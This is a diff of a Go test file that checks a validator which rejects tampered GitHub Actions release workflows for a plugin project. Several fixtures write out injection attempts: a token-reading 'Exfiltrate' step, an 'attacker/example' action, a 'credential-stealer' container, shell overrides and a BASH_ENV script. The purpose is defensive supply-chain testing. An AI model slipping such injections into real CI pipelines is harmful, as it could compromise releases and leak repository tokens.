@@ -203,7 +203,7 @@ func TestValidateReleaseWorkflowBoundaryRejectsExtraPublishCommand(t *testing.T)
 	t.Parallel()
 	root := t.TempDir()
 	workflow := validReleaseWorkflow + "      - name: Exfiltrate\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: printf '%s' \"$GH_TOKEN\" >/dev/null\n"
-	writeWorkflow(t, root, "release.yml", workflow)
+	writeReleaseWorkflows(t, root, workflow)
 	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "canonical") {
 		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want canonical publication rejection", err)
 	}
@@ -213,9 +213,19 @@ func TestValidateReleaseWorkflowBoundaryRejectsExtraPublishAction(t *testing.T) 
 	t.Parallel()
 	root := t.TempDir()
 	workflow := strings.Replace(validReleaseWorkflow, "      - name: Publish GitHub release\n", "      - { uses: attacker/example@"+strings.Repeat("a", 40)+" }\n      - name: Publish GitHub release\n", 1)
-	writeWorkflow(t, root, "release.yml", workflow)
+	writeReleaseWorkflows(t, root, workflow)
 	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "exactly") {
 		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want extra action rejection", err)
+	}
+}
+
+func TestValidateReleaseWorkflowBoundaryRejectsWorkflowDefaults(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	workflow := strings.Replace(validReleaseWorkflow, "permissions:\n  contents: read", "defaults:\n  run:\n    shell: bash -c 'printf malicious-side-effect; bash {0}'\npermissions:\n  contents: read", 1)
+	writeReleaseWorkflows(t, root, workflow)
+	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "unapproved key") {
+		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want workflow defaults rejection", err)
 	}
 }
 
@@ -223,9 +233,29 @@ func TestValidateReleaseWorkflowBoundaryRejectsPublishDefaults(t *testing.T) {
 	t.Parallel()
 	root := t.TempDir()
 	workflow := strings.Replace(validReleaseWorkflow, "    runs-on: ubuntu-24.04\n    permissions:\n      contents: write", "    runs-on: ubuntu-24.04\n    defaults:\n      run:\n        shell: bash -c 'printf malicious-side-effect; bash {0}'\n    permissions:\n      contents: write", 1)
-	writeWorkflow(t, root, "release.yml", workflow)
+	writeReleaseWorkflows(t, root, workflow)
 	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "unapproved key") {
 		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want publish defaults rejection", err)
+	}
+}
+
+func TestValidateReleaseWorkflowBoundaryRejectsBuildShell(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	workflow := strings.Replace(validReleaseWorkflow, "    outputs:\n      version:", "    defaults:\n      run:\n        shell: bash -c 'printf malicious-side-effect; bash {0}'\n    outputs:\n      version:", 1)
+	writeReleaseWorkflows(t, root, workflow)
+	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "unapproved key") {
+		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want build defaults rejection", err)
+	}
+}
+
+func TestValidateReleaseWorkflowBoundaryRejectsBuildStepShell(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	workflow := strings.Replace(validReleaseWorkflow, "      - name: Package\n        working-directory:", "      - name: Package\n        shell: bash -c 'printf malicious-side-effect; bash {0}'\n        working-directory:", 1)
+	writeReleaseWorkflows(t, root, workflow)
+	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "unapproved key") {
+		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want build step shell rejection", err)
 	}
 }
 
@@ -233,7 +263,7 @@ func TestValidateReleaseWorkflowBoundaryRejectsPublishContainer(t *testing.T) {
 	t.Parallel()
 	root := t.TempDir()
 	workflow := strings.Replace(validReleaseWorkflow, "    runs-on: ubuntu-24.04\n    permissions:\n      contents: write", "    runs-on: ubuntu-24.04\n    container: attacker.invalid/credential-stealer:latest\n    permissions:\n      contents: write", 1)
-	writeWorkflow(t, root, "release.yml", workflow)
+	writeReleaseWorkflows(t, root, workflow)
 	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "unapproved key") {
 		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want publish container rejection", err)
 	}
@@ -243,7 +273,7 @@ func TestValidateReleaseWorkflowBoundaryRejectsPublicationShell(t *testing.T) {
 	t.Parallel()
 	root := t.TempDir()
 	workflow := strings.Replace(validReleaseWorkflow, "      - name: Publish GitHub release\n        env:", "      - name: Publish GitHub release\n        shell: bash -c 'printf malicious-side-effect; bash {0}'\n        env:", 1)
-	writeWorkflow(t, root, "release.yml", workflow)
+	writeReleaseWorkflows(t, root, workflow)
 	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "unapproved key") {
 		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want publication shell rejection", err)
 	}
@@ -252,10 +282,95 @@ func TestValidateReleaseWorkflowBoundaryRejectsPublicationShell(t *testing.T) {
 func TestValidateReleaseWorkflowBoundaryAcceptsCanonicalWorkflow(t *testing.T) {
 	t.Parallel()
 	root := t.TempDir()
-	writeWorkflow(t, root, "release.yml", validReleaseWorkflow)
+	writeReleaseWorkflows(t, root, validReleaseWorkflow)
 	if err := validateReleaseWorkflowBoundary(root); err != nil {
 		t.Fatal(err)
 	}
+}
+
+func TestValidateReleaseWorkflowBoundaryRejectsBuildCommandMutation(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	workflow := strings.Replace(validReleaseWorkflow, "          make package VERSION=\"$VERSION\" OUT=\"$library\" ARCHIVE=\"$archive\"", "          make package VERSION=\"$VERSION\" OUT=\"$library\" ARCHIVE=\"$archive\"\n          printf injected >> \"$library\"", 1)
+	writeReleaseWorkflows(t, root, workflow)
+	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "canonical command") {
+		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want command mutation rejection", err)
+	}
+}
+
+func TestValidateReleaseWorkflowBoundaryRejectsBuildEnvironmentMutation(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	workflow := strings.Replace(validReleaseWorkflow, "        env:\n          VERSION: ${{ steps.release.outputs.version }}\n        run: |\n          set -euo pipefail\n          library=", "        env:\n          VERSION: ${{ steps.release.outputs.version }}\n          BASH_ENV: ../release-controls/attacker.sh\n        run: |\n          set -euo pipefail\n          library=", 1)
+	writeReleaseWorkflows(t, root, workflow)
+	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "canonical environment") {
+		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want environment mutation rejection", err)
+	}
+}
+
+func TestValidateReleaseWorkflowBoundaryRejectsFoldedBuildCommand(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	workflow := strings.Replace(validReleaseWorkflow, "        run: |\n          set -euo pipefail\n          go run -buildvcs=false ./.github/scripts/host-integration", "        run: >-\n          set -euo pipefail\n          go run -buildvcs=false ./.github/scripts/host-integration", 1)
+	writeReleaseWorkflows(t, root, workflow)
+	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "literal block style") {
+		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want folded build command rejection", err)
+	}
+}
+
+func TestValidateReleaseWorkflowBoundaryRejectsChangedRunChomping(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	workflow := strings.Replace(validReleaseWorkflow, "        run: |\n          set -euo pipefail\n          go run -buildvcs=false ./.github/scripts/host-integration", "        run: |-\n          set -euo pipefail\n          go run -buildvcs=false ./.github/scripts/host-integration", 1)
+	writeReleaseWorkflows(t, root, workflow)
+	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "exactly run: |") {
+		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want changed chomping rejection", err)
+	}
+}
+
+func TestValidateReleaseWorkflowBoundaryRejectsFoldedPublicationCommand(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	workflow := strings.Replace(validReleaseWorkflow, "        run: |\n          set -euo pipefail\n          actual_tag_object=", "        run: >-\n          set -euo pipefail\n          actual_tag_object=", 1)
+	writeReleaseWorkflows(t, root, workflow)
+	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "literal block style") {
+		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want folded publication command rejection", err)
+	}
+}
+
+func TestValidateReleaseWorkflowBoundaryRejectsRecoveryWeakening(t *testing.T) {
+	t.Parallel()
+	for _, test := range []struct {
+		name string
+		old  string
+		new  string
+	}{
+		{name: "direct branch push", old: "tags: [\"v*\"]", new: "tags: [\"v*\"]\n    branches: [release-recovery/v0.1.0]"},
+		{name: "broad recovery branch", old: "branches: [release-recovery/v0.1.0]", new: "branches: [release-recovery/*]"},
+		{name: "failed upstream accepted", old: "github.event.workflow_run.conclusion == 'success'", new: "github.event.workflow_run.conclusion != ''"},
+		{name: "mutable control checkout", old: "ref: ${{ github.sha }}", new: "ref: ${{ github.event.workflow_run.head_sha }}"},
+		{name: "control validation removed", old: "working-directory: release-controls\n        run: |\n          set -euo pipefail", new: "working-directory: release-source\n        run: |\n          set -euo pipefail"},
+		{name: "mutable recovery checkout", old: "ref: ${{ steps.target.outputs.tag }}", new: "ref: ${{ github.event.workflow_run.head_sha }}"},
+		{name: "branch-derived publish tag", old: "RAW_TAG: ${{ needs.build.outputs.tag }}", new: "RAW_TAG: ${{ github.ref_name }}"},
+		{name: "missing publish tag object", old: "EXPECTED_TAG_OBJECT: ${{ needs.build.outputs.tag_object }}", new: "EXPECTED_TAG_OBJECT: deadbeef"},
+	} {
+		test := test
+		t.Run(test.name, func(t *testing.T) {
+			t.Parallel()
+			root := t.TempDir()
+			workflow := strings.Replace(validReleaseWorkflow, test.old, test.new, 1)
+			writeReleaseWorkflows(t, root, workflow)
+			if err := validateReleaseWorkflowBoundary(root); err == nil {
+				t.Fatal("validateReleaseWorkflowBoundary() accepted weakened recovery workflow")
+			}
+		})
+	}
+}
+
+func writeReleaseWorkflows(t *testing.T, root, release string) {
+	t.Helper()
+	writeWorkflow(t, root, "ci.yml", "name: CI\non:\n  push:\n    branches: [main, release-recovery/v0.1.0]\n  pull_request:\n")
+	writeWorkflow(t, root, "release.yml", release)
 }
 
 func writeWorkflow(t *testing.T, root, name, contents string) {
@@ -270,12 +385,157 @@ func writeWorkflow(t *testing.T, root, name, contents string) {
 }
 
 const validReleaseWorkflow = `name: Release
+on:
+  push:
+    tags: ["v*"]
+  workflow_run:
+    workflows: [CI]
+    types: [completed]
+    branches: [release-recovery/v0.1.0]
 permissions:
   contents: read
 jobs:
   build:
+    if: >-
+      github.event_name == 'push' ||
+      (github.event.workflow_run.conclusion == 'success' &&
+       github.event.workflow_run.event == 'push' &&
+       github.event.workflow_run.head_repository.full_name == github.repository &&
+       github.event.workflow_run.head_branch == 'release-recovery/v0.1.0' &&
+       github.event.workflow_run.head_sha == github.workflow_sha)
     runs-on: ubuntu-24.04
-    steps: []
+    outputs:
+      version: ${{ steps.release.outputs.version }}
+      tag: ${{ steps.target.outputs.tag }}
+      tag_object: ${{ steps.target.outputs.tag_object }}
+    steps:
+      - name: Check out trusted release controls
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
+        with:
+          fetch-depth: 0
+          persist-credentials: false
+          ref: ${{ github.sha }}
+          path: release-controls
+      - name: Set up Go
+        uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e
+        with:
+          go-version-file: release-controls/go.mod
+          cache-dependency-path: release-controls/go.sum
+          cache: true
+      - name: Validate trusted release controls
+        working-directory: release-controls
+        run: |
+          set -euo pipefail
+          go test ./.github/scripts/release-validation
+          go run -buildvcs=false ./.github/scripts/release-validation -mode source
+          .github/scripts/select-release-tag_test.sh
+      - name: Select release tag
+        id: target
+        working-directory: release-controls
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          EVENT_REF: ${{ github.ref }}
+          EVENT_SHA: ${{ github.sha }}
+          WORKFLOW_RUN_SHA: ${{ github.event.workflow_run.head_sha }}
+        run: |
+          set -euo pipefail
+          raw_tag=$(.github/scripts/select-release-tag.sh \
+            "$EVENT_NAME" "$EVENT_REF" "$EVENT_SHA" "$WORKFLOW_RUN_SHA" .)
+          tag_object=$(git rev-parse "$raw_tag")
+          printf 'tag=%s\n' "$raw_tag" >> "$GITHUB_OUTPUT"
+          printf 'tag_object=%s\n' "$tag_object" >> "$GITHUB_OUTPUT"
+      - name: Check out immutable release source
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
+        with:
+          fetch-depth: 0
+          persist-credentials: false
+          ref: ${{ steps.target.outputs.tag }}
+          path: release-source
+      - name: Validate tag and provenance
+        id: release
+        working-directory: release-source
+        env:
+          RAW_TAG: ${{ steps.target.outputs.tag }}
+          EXPECTED_TAG_OBJECT: ${{ steps.target.outputs.tag_object }}
+        run: |
+          set -euo pipefail
+          version=$(go run -buildvcs=false ./.github/scripts/release-validation -mode version -tag "$RAW_TAG")
+          test "$(git rev-parse "$RAW_TAG")" = "$EXPECTED_TAG_OBJECT"
+          release_sha=$(git rev-parse "$RAW_TAG^{commit}")
+          test "$(git rev-parse HEAD)" = "$release_sha"
+          git fetch --no-tags origin main
+          git merge-base --is-ancestor "$release_sha" origin/main
+          printf 'version=%s\n' "$version" >> "$GITHUB_OUTPUT"
+      - name: Verify
+        working-directory: release-source
+        run: |
+          make fmt-check
+          make vet
+          make test
+          make test-release
+          make validate-source
+          make scan-secrets
+      - name: Lint
+        uses: golangci/golangci-lint-action@ba0d7d2ec06a0ea1cb5fa41b2e4a3ab91d21278a
+        with:
+          version: v2.13.2
+          working-directory: release-source
+      - name: Package
+        working-directory: release-source
+        env:
+          VERSION: ${{ steps.release.outputs.version }}
+        run: |
+          set -euo pipefail
+          library="dist/zai-coding-plan-v${VERSION}.so"
+          archive="dist/zai-coding-plan_${VERSION}_linux_amd64.zip"
+          make package VERSION="$VERSION" OUT="$library" ARCHIVE="$archive"
+      - name: Verify plugin-store artifact
+        working-directory: release-source
+        env:
+          VERSION: ${{ steps.release.outputs.version }}
+          RAW_TAG: ${{ steps.target.outputs.tag }}
+        run: |
+          set -euo pipefail
+          library="dist/zai-coding-plan-v${VERSION}.so"
+          archive="dist/zai-coding-plan_${VERSION}_linux_amd64.zip"
+          nm -D "$library" | grep -Eq '[[:space:]]cliproxy_plugin_init$'
+          test "$(unzip -Z1 "$archive")" = "zai-coding-plan.so"
+          cmp "$library" <(unzip -p "$archive" zai-coding-plan.so)
+          go run -buildvcs=false ./.github/scripts/release-validation \
+            -mode release -version "$VERSION" -tag "$RAW_TAG"
+      - name: Extract approved host image
+        id: host
+        working-directory: release-source
+        run: |
+          set -euo pipefail
+          host=$(.github/scripts/extract-host-image.sh .github/release-host-image.json "$RUNNER_TEMP/host-image")
+          printf 'binary=%s\n' "$host" >> "$GITHUB_OUTPUT"
+      - name: Test approved host image
+        working-directory: release-source
+        env:
+          VERSION: ${{ steps.release.outputs.version }}
+          HOST_BINARY: ${{ steps.host.outputs.binary }}
+        run: |
+          set -euo pipefail
+          go run -buildvcs=false ./.github/scripts/host-integration \
+            -host-binary "$HOST_BINARY" -plugin "dist/zai-coding-plan-v${VERSION}.so"
+      - name: Stage release artifacts
+        working-directory: release-source
+        env:
+          VERSION: ${{ steps.release.outputs.version }}
+        run: |
+          set -euo pipefail
+          mkdir release-artifacts
+          cp "dist/zai-coding-plan-v${VERSION}.so" \
+             "dist/zai-coding-plan_${VERSION}_linux_amd64.zip" \
+             dist/checksums.txt release-artifacts/
+      - name: Upload release artifacts
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
+        with:
+          name: release-artifacts
+          path: release-source/release-artifacts/
+          if-no-files-found: error
+          retention-days: 1
   publish:
     needs: build
     runs-on: ubuntu-24.04
@@ -292,8 +552,14 @@ jobs:
           GH_TOKEN: ${{ github.token }}
           GH_REPO: ${{ github.repository }}
           VERSION: ${{ needs.build.outputs.version }}
-          RAW_TAG: ${{ github.ref_name }}
+          RAW_TAG: ${{ needs.build.outputs.tag }}
+          EXPECTED_TAG_OBJECT: ${{ needs.build.outputs.tag_object }}
         run: |
+          set -euo pipefail
+          actual_tag_object=$(gh api "repos/${GH_REPO}/git/ref/tags/${RAW_TAG}" --jq .object.sha)
+          test "$actual_tag_object" = "$EXPECTED_TAG_OBJECT"
+          test "$RAW_TAG" = v0.1.0
+          test "$EXPECTED_TAG_OBJECT" = 93441174a393b2d7487df954b4f10103742285fb
           gh release create "$RAW_TAG" \
             "release-artifacts/zai-coding-plan-v${VERSION}.so" \
             "release-artifacts/zai-coding-plan_${VERSION}_linux_amd64.zip" \
